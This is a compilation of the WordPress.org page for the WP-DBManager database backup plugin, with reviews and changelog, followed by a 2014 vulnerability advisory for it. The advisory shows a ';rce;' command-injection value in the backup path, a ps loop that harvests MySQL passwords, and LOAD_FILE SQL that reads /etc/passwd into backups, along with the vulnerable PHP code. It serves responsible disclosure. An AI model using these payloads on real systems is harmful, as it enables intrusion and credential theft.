* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

WP-DBManager

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fwp-dbmanager&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fwp-dbmanager&locale=en_US)

Search plugins

![](https://ps.w.org/wp-dbmanager/assets/banner-772x250.jpg?rev=1206751)
![](https://ps.w.org/wp-dbmanager/assets/icon.svg?rev=977538)
# WP-DBManager

By [Lester ‘GaMerZ’ Chan](https://lesterchan.net)

[Download](https://downloads.wordpress.org/plugin/wp-dbmanager.2.80.10.zip)

* [Details](https://wordpress.org/plugins/wp-dbmanager/#description)
* [Reviews](https://wordpress.org/plugins/wp-dbmanager/#reviews)
* [Development](https://wordpress.org/plugins/wp-dbmanager/#developers)

[Support](https://wordpress.org/support/plugin/wp-dbmanager/)

## Description

Allows you to optimize database, repair database, backup database, restore database, delete backup database , drop/empty tables and run selected queries. Supports automatic scheduling of backing up, optimizing and repairing of database.

### General Usage

1. Activate `WP-DBManager` Plugin
2. The script will automatically create a folder called `backup-db` in the wp-content folder if that folder is writable. If it is not created, please create the folder and ensure that the folder is writable
3. Open `Folder: wp-content/backup-db`
4. If you are on Apache, move the `htaccess.txt` file from `Folder: wp-content/plugins/wp-dbmanager` to `Folder: wp-content/backup-db/.htaccess` if it is not there already
5. If you are on IIS, move the `Web.config.txt` file from `Folder: wp-content/plugins/wp-dbmanager` to `Folder: wp-content/backup-db/Web.config` if it is not there already
6. Move `index.php` file from `Folder: wp-content/plugins/wp-dbmanager` to `Folder: wp-content/backup-db/index.php` if it is not there already
7. Go to `WP-Admin -> Database -> DB Options` to configure the database options

### Build Status

### Development

* [https://github.com/lesterchan/wp-dbmanager](https://github.com/lesterchan/wp-dbmanager "https://github.com/lesterchan/wp-dbmanager")

### Translations

* [http://dev.wp-plugins.org/browser/wp-dbmanager/i18n/](http://dev.wp-plugins.org/browser/wp-dbmanager/i18n/ "http://dev.wp-plugins.org/browser/wp-dbmanager/i18n/")

### Credits

* Plugin icon by [Freepik](http://www.freepik.com) from [Flaticon](http://www.flaticon.com)

### Donations

* I spent most of my free time creating, updating, maintaining and supporting these plugins, if you really love my plugins and could spare me a couple of bucks, I will really appreciate it. If not feel free to use it without any obligations.

### Disclaimer

* Note that this plugin passes your datababase password via –password in the command line of mysqldump. This is convenient but as a trade off, it is insecure.
* On some systems, your password becomes visible to system status programs such as ps that may be invoked by other users to display command lines. MySQL clients typically overwrite the command-line password argument with zeros during their initialization sequence. However, there is still a brief interval during which the value is visible. Also, on some systems this overwriting strategy is ineffective and the password remains visible to ps. Source: [End-User Guidelines for Password Security](http://dev.mysql.com/doc/refman/5.5/en/password-security-user.html)
* If this is a concern to you, I recommend another database backup plugin called [WP-DB-Backup](https://wordpress.org/plugins/wp-db-backup/)
* To know about the difference between WP-DBManager and WP-DB-backup, checkout **What is the difference between WP-DBManager and WP-DB-Backup?** in the [FAQ section](https://wordpress.org/plugins/wp-dbmanager/faq/).

## Screenshots

* [![](https://ps.w.org/wp-dbmanager/assets/screenshot-1.png?rev=1206751)](https://ps.w.org/wp-dbmanager/assets/screenshot-1.png?rev=1206751)

  Admin – Backup DB
* [![](https://ps.w.org/wp-dbmanager/assets/screenshot-2.png?rev=1206751)](https://ps.w.org/wp-dbmanager/assets/screenshot-2.png?rev=1206751)

  Admin – Empty/Drop Tables In DB
* [![](https://ps.w.org/wp-dbmanager/assets/screenshot-3.png?rev=1206751)](https://ps.w.org/wp-dbmanager/assets/screenshot-3.png?rev=1206751)

  Admin – DB Information
* [![](https://ps.w.org/wp-dbmanager/assets/screenshot-4.png?rev=1206751)](https://ps.w.org/wp-dbmanager/assets/screenshot-4.png?rev=1206751)

  Admin – Manage DB
* [![](https://ps.w.org/wp-dbmanager/assets/screenshot-5.png?rev=1206751)](https://ps.w.org/wp-dbmanager/assets/screenshot-5.png?rev=1206751)

  Admin – Optimize DB
* [![](https://ps.w.org/wp-dbmanager/assets/screenshot-6.png?rev=1206751)](https://ps.w.org/wp-dbmanager/assets/screenshot-6.png?rev=1206751)

  Admin – DB Options
* [![](https://ps.w.org/wp-dbmanager/assets/screenshot-7.png?rev=1206751)](https://ps.w.org/wp-dbmanager/assets/screenshot-7.png?rev=1206751)

  Admin – DB Options
* [![](https://ps.w.org/wp-dbmanager/assets/screenshot-8.png?rev=1206751)](https://ps.w.org/wp-dbmanager/assets/screenshot-8.png?rev=1206751)

  Admin – Repair DB
* [![](https://ps.w.org/wp-dbmanager/assets/screenshot-9.png?rev=1206751)](https://ps.w.org/wp-dbmanager/assets/screenshot-9.png?rev=1206751)

  Admin – Run Query in DB

## FAQ

### My database is not backed up / My backup file is 0Kb

* Ensure that your host allows you to access mysqldump. You can try to narrow the problem by Debugging via SSH:

1. In `wp-dbmanager.php`
2. Find `check_backup_files();` on line 246
3. Add below it `echo $command;`
4. Go to `WP-Admin -> Database -> Backup`
5. Click `Backup`
6. It should print some debugging statements
7. Copy that line than run it in SSH
8. If you need help on SSH contact your host or google for more info

### What is the difference between WP-DBManager and WP-DB-Backup?

* WP-DBManager uses `mysqldump` application to generate the backup and `mysql` application to restore them via shell.
* WP-DB-Backup uses PHP to generate the backup. In some cases WP-DB-Backup will work better for you because it requires less permissions. Not all host allows you to access mysqldump/mysql directly via shell.
* WP-DBManager allows you to have automatic optimizing and repairing of database on top of backing up of database.

### Why do I get the message “Warning: Your backup folder MIGHT be visible to the public!”?

* Ensure that you have renamed `htaccess.txt` to `.htaccess` and placed it in your backup folder (defaults to `wp-content/backup-db/`)
* If you are 100% sure you have did that and have verfied that the folder no longer is accessible to the public by visiting the URL `http://yousite.com/wp-content/backup-db/`, you can safely disable the notice by going to `WP-Admin -> Database -> DB Options` and set `Hide Admin Notices` to `Yes`.

## Reviews

![](https://secure.gravatar.com/avatar/21276ef0a192ecd0a7bef849cb6963537c147a3926b2de25d7b8c1b5a4b233ec?s=60&d=retro&r=g)
### [Best one for my particular needs, thanks!](https://wordpress.org/support/topic/best-one-for-my-particular-needs-thanks/)

[robaxxx](https://profiles.wordpress.org/robaxxx/ "Posts by robaxxx")
November 5, 2022

I use this along with a Windows program called Backup4All on my server to create regular backups of my WP instances to Amazon S3. It’s also easy to do an instant db backup and then zip up the site folder with the db inside on the server if I’m doing something risky. I wanted something that was simple, affordable and logical and found this one best after testing many others. Thanks heaps!

![](https://secure.gravatar.com/avatar/08b5d287140d20bc2ed07150fed85d5f4597b9928da8937aaef77c7d051e3587?s=60&d=retro&r=g)
### [This was one tool used to help me bring back my wp site](https://wordpress.org/support/topic/this-was-one-tool-used-to-help-me-bring-back-my-wp-site/)

[jamesoutland](https://profiles.wordpress.org/jamesoutland/ "Posts by jamesoutland")
October 2, 2022

1st, I was able to target the files I wanted to clean. I would like to add just be careful what you remove. Then I was able to reinstall a program and it worked. Not sure the tecnical reasons why it worked but it did. Thank you!

![](https://secure.gravatar.com/avatar/68d12b0bc5a279b854b74161cd3746f387b7549281de909163cf0399cd53e706?s=60&d=retro&r=g)
### [it doesnt work](https://wordpress.org/support/topic/it-doesnt-work-311/)

[ntalam](https://profiles.wordpress.org/ntalam/ "Posts by ntalam")
August 29, 2022
1 reply

SELECT \* FROM ‘….
returns me nothing

![](https://secure.gravatar.com/avatar/a9c3ca262ef07c913f046456d6540c01259d5ac0d19682921b716dde1fcca130?s=60&d=retro&r=g)
### [Version 2.80.7 works again](https://wordpress.org/support/topic/no-longer-usable-6/)

[nonick08](https://profiles.wordpress.org/nonick08/ "Posts by nonick08")
July 19, 2022
1 reply

From version 2.80.7 the menu is visible again without activated theme and plugin editor.
old
Since version 2.80.6 only works with activated theme and plugin editor.

![](https://secure.gravatar.com/avatar/4883c89d4a8a6dc5c6b0a2e37e6fd71a29e85ea26ec992c566526aab3954a71f?s=60&d=retro&r=g)
### [Fantastic Plugin!](https://wordpress.org/support/topic/fantastic-plugin-1596/)

[girirajnet](https://profiles.wordpress.org/girirajnet/ "Posts by girirajnet")
June 14, 2021
2 replies

I have been using this plugin for years and its working fine so far.
I’m wondering why it’s not getting any updates?! It updated a year back, but it’s supporting the recent version of WordPress 5.7.2 (soon 5.8), and it’s working fine.
My worry is due to compatibility issue it may give problem while restore, and it may be data risk.
Hope the plugin author will update the plugin and make it compatible with current version of WordPress.
I would like to take this opportunity to thank the author. Its really simple and easy backup restore and with a lot of options, especially no confusion in the settings.
The plugin is worth more than 5 star.
Thank You
Giri

![](https://secure.gravatar.com/avatar/76003be628c1639ac607ae9b0c73e5ca0b9ebda10f669b7775120b57869815c9?s=60&d=retro&r=g)
### [The best one](https://wordpress.org/support/topic/the-best-one-109/)

[CyberSEO](https://profiles.wordpress.org/cyberseo/ "Posts by CyberSEO")
March 17, 2021

Using it for years. WP-DBManager is a real life saver.

[Read all 93 reviews](https://wordpress.org/support/plugin/wp-dbmanager/reviews/)
## Contributors & Developers

“WP-DBManager” is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/e04a2a5a55fe8c1287bc241b164dbcdb044740a5b52a773fd846102060c1c08b?s=32&d=mm&r=g) [Lester Chan](https://profiles.wordpress.org/gamerz/)

“WP-DBManager” has been translated into 10 locales. Thank you to [the translators](https://translate.wordpress.org/projects/wp-plugins/wp-dbmanager/contributors) for their contributions.

[Translate “WP-DBManager” into your language.](https://translate.wordpress.org/projects/wp-plugins/wp-dbmanager)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/wp-dbmanager/), check out the [SVN repository](https://plugins.svn.wordpress.org/wp-dbmanager/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/wp-dbmanager/) by [RSS](https://plugins.trac.wordpress.org/log/wp-dbmanager/?limit=100&mode=stop_on_copy&format=rss).

## Changelog

### Version 2.80.10

* FIXED: Don’t throw fatal error if unknown .sql files are inside the database backup folder.

### Version 2.80.9

* FIXED: Handle folder permissions properly

### Version 2.80.8

* FIXED: Miss out database-backup.php.

### Version 2.80.7

* FIXED: Changed ‘edit\_files’ capability to ‘install\_plugins’ instead.

### Version 2.80.6

* FIXED: Remove ‘manage\_database’ and use ‘edit\_files’ to check for capability instead.

### Version 2.80.5

* FIXED: Changed utf8 to utf8mb4 for backing up

### Version 2.80.4

* FIXED: Clear WP-DBManager cron jobs on uninstall

### Version 2.80.3

* FIXED: Poly fill array\_key\_first() for PHP < 7.3

### Version 2.80.2

* FIXED: Newer backup is being replaced instead of older backup

### Version 2.80.1

* FIXED: 1970 date issues.
* FIXED: Sorting order of backup files.

### Version 2.80

* NEW: Prefix MD5 checksum to the database backup file to prevent user from guessing the filename.

### Version 2.79.2

* FIXED: Arbitrary file delete bug by sanitizing filename. Props [RIPS Technologies](https://www.ripstech.com).

### Version 2.79.1

* FIXED: Added default utf8 charset

### Version 2.79

* FIXED: Proper check for disabled functions

### Version 2.78.1

* NEW: Bump WordPress 4.7
* FIXED: Undefined index: repair and repair\_period

### Version 2.78

* FIXED: escapeshellcmd on Windows. Props Gregory Karpinsky.
* FIXED: Move wp\_mkdir\_p() up before if check. Props Scott Allen.

### Version 2.77

* FIXED: Blank screen downloading backup
* FIXED: Remove MySQL Version check to display tables stats

### Version 2.76

* NEW: Add wp\_dbmanager\_before\_escapeshellcmd action just before escapeshellcmd()
* FIXED: Missing / for Windows

### Version 2.75

* FIXED: When activating the plugin, copy index.php to the backup folder
* FIXED: If you are on Apache, .htaccess will be copied to the backup folder, if you are on IIS, Web.config will be copied to the backup folder
* FIXED: When choosing 1 Month(s) for Backup/Optimize/Repair, the next date calculation is wrong

### Version 2.74

* FIXED: escapeshellarg() already escape $, no need to double escape it

### Version 2.73

* FIXED: Unable to backup/restore database if user database password has certain special characters in them

### Version 2.72

* FIXED: Use escapeshellcmd() to escape shell commands. Props Larry W. Cashdollari.
* FIXED: Do not allow LOAD\_FILE to be run. Props Larry W. Cashdollari.
* FIXED: Uses dbmanager\_is\_valid\_path() to check for mysql and mysqldump path. Fixes arbitrary command injection using backup path. Props Larry W. Cashdollari.
* FIXED: Uses realpath() to check for backup path. Fixes arbitrary command injection using backup path. Props Larry W. Cashdollari.

### Version 2.71

* NEW: Bump to 4.0

### Version 2.70

* New: Uses WordPress 3.9 Dashicons
* NEW: Allow you to hide admin notices in the DB Options page
* NEW: Allow Multisite Network Activate
* NEW: Uses WordPress uninstall.php file to uninstall the plugin
* NEW: Uses wp\_mail() to send email instead of PHP mail()
* NEW: New From E-mail, From Name & Subject template
* FIXED: Issues with email from field if site title contains , (comma)
* FIXED: Notices

### Version 2.65

* FIXED: Set default character set to UTF-8. Props Karsonito

### Version 2.64

* FIXED: Use intval() instead of is\_int() when checking for port number. Props [Webby Scots](http://webbyscots.com/ "Webby Scots")

### Version 2.63 (03-05-2011)

* NEW: Added Auto Repair Functionality
* NEW: Added nonce To All Forms For Added Security

## Meta

* Version **2.80.10**
* Last updated **2 months ago**
* Active installations **80,000+**
* WordPress version **4.0 or higher**
* Tested up to **6.7.1**
* Languages
  See all 11

  Close

  [Chinese (Taiwan)](https://tw.wordpress.org/plugins/wp-dbmanager/), [Dutch](https://nl.wordpress.org/plugins/wp-dbmanager/), [English (Canada)](https://en-ca.wordpress.org/plugins/wp-dbmanager/), [English (US)](https://wordpress.org/plugins/wp-dbmanager/), [French (France)](https://fr.wordpress.org/plugins/wp-dbmanager/), [Greek](https://el.wordpress.org/plugins/wp-dbmanager/), [Japanese](https://ja.wordpress.org/plugins/wp-dbmanager/), [Russian](https://ru.wordpress.org/plugins/wp-dbmanager/), [Serbian](https://sr.wordpress.org/plugins/wp-dbmanager/), [Spanish (Spain)](https://es.wordpress.org/plugins/wp-dbmanager/), and [Spanish (Venezuela)](https://ve.wordpress.org/plugins/wp-dbmanager/).

  [Translate into your language](https://translate.wordpress.org/projects/wp-plugins/wp-dbmanager)
* Tags [database](https://wordpress.org/plugins/tags/database/)[manage](https://wordpress.org/plugins/tags/manage/)[manager](https://wordpress.org/plugins/tags/manager/)[table](https://wordpress.org/plugins/tags/table/)
* [Advanced View](https://wordpress.org/plugins/wp-dbmanager/advanced/)

## Ratings

4.4 out of 5 stars.

* [76 5-star reviews
  5 stars

  76](https://wordpress.org/support/plugin/wp-dbmanager/reviews/?filter=5)
* [3 4-star reviews
  4 stars

  3](https://wordpress.org/support/plugin/wp-dbmanager/reviews/?filter=4)
* [2 3-star reviews
  3 stars

  2](https://wordpress.org/support/plugin/wp-dbmanager/reviews/?filter=3)
* [0 2-star reviews
  2 stars

  0](https://wordpress.org/support/plugin/wp-dbmanager/reviews/?filter=2)
* [12 1-star reviews
  1 star

  12](https://wordpress.org/support/plugin/wp-dbmanager/reviews/?filter=1)

[Add my review](https://wordpress.org/support/plugin/wp-dbmanager/reviews/#new-post)

[See all reviews](https://wordpress.org/support/plugin/wp-dbmanager/reviews/)

## Contributors

* ![](https://secure.gravatar.com/avatar/e04a2a5a55fe8c1287bc241b164dbcdb044740a5b52a773fd846102060c1c08b?s=32&d=mm&r=g) [Lester Chan](https://profiles.wordpress.org/gamerz/)
## Support

Issues resolved in last two months:

0 out of 1

[View support forum](https://wordpress.org/support/plugin/wp-dbmanager/)

## Donate

Would you like to support the advancement of this plugin?

[Donate to this plugin](http://lesterchan.net/site/donation/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from packetstormsecurity.com_1dc9d4e5_20250125_113900.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.vapid.dhs.org_38fbf1a5_20250125_113903.html ===

## Title: Vulnerabilities in WordPress Database Manager v2.7.1

Author: Larry W. Cashdollar, @\_larry0

Date: 10/13/2014

Download: [https://wordpress.org/plugins/wp-dbmanager/](https://www.google.com/url?q=https%3A%2F%2Fwordpress.org%2Fplugins%2Fwp-dbmanager%2F&sa=D&sntz=1&usg=AFQjCNEvu384FZseIJ60Zae7bidjBb6IYw)

Downloads: 1,171,358

Vendor: Lester Chan, https://profiles.wordpress.org/gamerz/

Contacted: 10/13/2014, Vulnerabilities addressed in v2.7.2.

CVE: 2014-8334,2014-8335

OSVDBID:113508,113507,113509

Vulnerability: Plugin suffers from command injection, exposes MySQL database credentials to the process table and allows the user to download system files via the ‘Run SQL Query’ feature. User authentication with current\_user\_can('manage\_database')) privileges are required.

## PoC

## Command Injection

![Screen Shot 2014-10-13 at 4.38.13 PM.png](images/image00.png)

![Screen_Shot_2014-10-13_at_4_39_12_PM.png](images/image01.png)

The command that is sent through passthru() is the following:

/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"

--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db\';rce;\'/1413225588\_-\_wordpress.sql

rce is just a homebrew .c binary I wrote for testing command injections it creates a file

in /tmp with some stats on who executed it.

# cat /tmp/RCE\_JChl9c

ARGGHHH I've been executed! my pid is :16169 Parent id 16168

Name:        sh

State:        S (sleeping)

Tgid:        16168

Pid:        16168

PPid:        15925

TracerPid:        0

Uid:        33        33        33        33

Gid:        33        33        33        33

FDSize:        32

Groups:        33

In the following lines commands can be injected into the variables being used to build

the command by using ;command;

$backup['filepath']

$backup['mysqldumppath']

I use $backup[‘filepath’] or “Path To Backup:”  for my PoC.

/usr/share/wordpress/wp-content/backup-db;rce;

Saving and then Running a backup executes /usr/bin/rce, the command that is sent through passthru() is the following:

/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"

--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db;rce;/1413225588\_-\_wordpress.sql

rce is just a homebrew .c binary I wrote for testing command injections, it creates a file

in /tmp with some stats on who executed it.

# cat /tmp/RCE\_JChl9c

ARGGHHH I've been executed! my pid is :16169 Parent id 16168

Name:        sh

State:        S (sleeping)

Tgid:        16168

Pid:        16168

PPid:        15925

TracerPid:        0

Uid:        33        33        33        33

Gid:        33        33        33        33

FDSize:        32

Groups:        33

## Mysql Credentials Leaked to Process Table

Also by running a simple script:

PoC:

 $ while (true); do  echo -n `ps ax | grep m[y]sqldump`; done

6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776\_-\_wordpress.sql 6328 ? R 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776\_-\_wordpress.sql6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776\_-\_wordpress.sql 6328 ? S 0:00 /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables wordpress6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776\_-\_wordpress.sql 6328 ? S 0:00 /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables wordpress

A malicious local user can harvest credentials for the mysql database off the process table.

The trouble is the code doesn’t properly sanitize user input and is being passed directly to passthru or system depending on which OS you’re using.

     In wp-dbmanager.php:

        86                 $backup['command'] = '';

     87                 $brace = (substr(PHP\_OS, 0, 3) == 'WIN') ? '"' : '';

     88                 if(intval($backup\_options['backup\_gzip']) == 1) {

     89                         $backup['filename'] = $backup['date'].'\_-\_'.DB\_NAME.'.sql.gz';

     90                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];

     91                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force --host="'.$backup['host'].'" --user="'.DB\_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB\_NAME.' | gzip > '.$brace.$backup['filepath'].$brace;

     92                 } else {

     93                         $backup['filename'] = $backup['date'].'\_-\_'.DB\_NAME.'.sql';

     94                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];

     95                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force --host="'.$backup['host'].'" --user="'.DB\_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB\_NAME.' > '.$brace.$backup['filepath'].$brace;

     96                 }

     97                 execute\_backup($backup['command']);

    211 ### Executes OS-Dependent mysqldump Command (By: Vlad Sharanhovich)

    212 function execute\_backup($command) {

    213         $backup\_options = get\_option('dbmanager\_options');

    214         check\_backup\_files();

    215         if(substr(PHP\_OS, 0, 3) == 'WIN') {

    216                 $writable\_dir = $backup\_options['path'];

    217                 $tmpnam = $writable\_dir.'/wp-dbmanager.bat';

    218                 $fp = fopen($tmpnam, 'w');

    219                 fwrite($fp, $command);

    220                 fclose($fp);

    221                 system($tmpnam.' > NUL', $error);

    222                 unlink($tmpnam);

    223         } else {

    224                 passthru($command, $error);

    225         }

    226         return $error;

    227 }

In database-manage.php:

        46                                 if(stristr($database\_file, '.gz')) {

     47                                         $backup['command'] = 'gunzip < '.$brace.$backup['path'].'/'.$database\_file.$brace.' | '.$brace.$backup['mysqlpath'].$brace.' --host="'.$backup['host'].'" --user="'.DB\_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB\_NAME;

     48                                 } else {

     49                                         $backup['command'] = $brace.$backup['mysqlpath'].$brace.' --host="'.$backup['host'].'" --user="'.DB\_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB\_NAME.' < '.$brace.$backup['path'].'/'.$database\_file.$brace;

     50                                 }

     51                                 passthru($backup['command'], $error);

## File Downloads

In the ‘Sql Run Query’ Panel only a few queries are allowed (Use Only INSERT, UPDATE, REPLACE, DELETE, CREATE and ALTER statements.) but these are suffiecient to download sensitive system files:

CREATE TABLE password (passwords varchar(8096));

INSERT into password (passwords) VALUES(LOAD\_FILE(‘/etc/passwd’));

Then run a database backup, and download the backup file or send via email.

From 1413409573\_-\_wordpress.sql:

INSERT INTO `password` VALUES ('root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\nDebian-exim:x:101:104::/var/spool/exim4:/bin/false\nstatd:x:102:65534::/var/lib/nfs:/bin/false\nsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin\npostgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nlarry:x:1000:1000:larry,,,:/home/larry:/bin/bash\nmysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false\nmessagebus:x:106:110::/var/run/dbus:/bin/false\n');

/\*!40000 ALTER TABLE `password` ENABLE KEYS \*/;


